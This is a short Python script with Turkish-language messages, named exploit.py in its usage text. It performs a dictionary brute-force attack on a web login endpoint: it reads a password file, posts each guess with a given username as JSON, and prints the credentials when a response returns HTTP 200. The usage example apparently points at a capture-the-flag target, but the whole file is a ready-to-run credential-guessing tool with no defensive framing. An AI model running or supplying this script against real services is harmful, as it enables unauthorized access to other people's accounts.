#!/usr/bin/env python3
import sys
import requests

def main():
    if len(sys.argv) != 4:
        print(f"Kullanım: {sys.argv[0]} <URL> <username> <password_file>")
        print("Örnek: exploit.py http://ctf.com john passwords.txt")
        sys.exit(1)

    url = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]

    try:
        with open(password_file, 'r') as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(f"Hata: {password_file} dosyası bulunamadı!")
        sys.exit(1)

    print(f"Brute-force başlatılıyor...\nHedef: {url}\nKullanıcı: {username}\nŞifreler: {len(passwords)} adet")

    for password in passwords:
        data = {
            'username': username,
            'password': password
        }

        try:
            response = requests.post(url, json=data, timeout=5)
            
            # Başarı kontrolü (API'ye göre değişebilir)
            if response.status_code == 200:
                print(f"[+] BAŞARILI! {username}:{password}")
                print(f"Yanıt: {response.text}")
                break
            else:
                print(f"[-] Deneme: {password} → Başarısız (HTTP {response.status_code})")
        
        except requests.exceptions.RequestException as e:
            print(f"[!] Hata: {password} → {str(e)}")

if __name__ == "__main__":
    main()
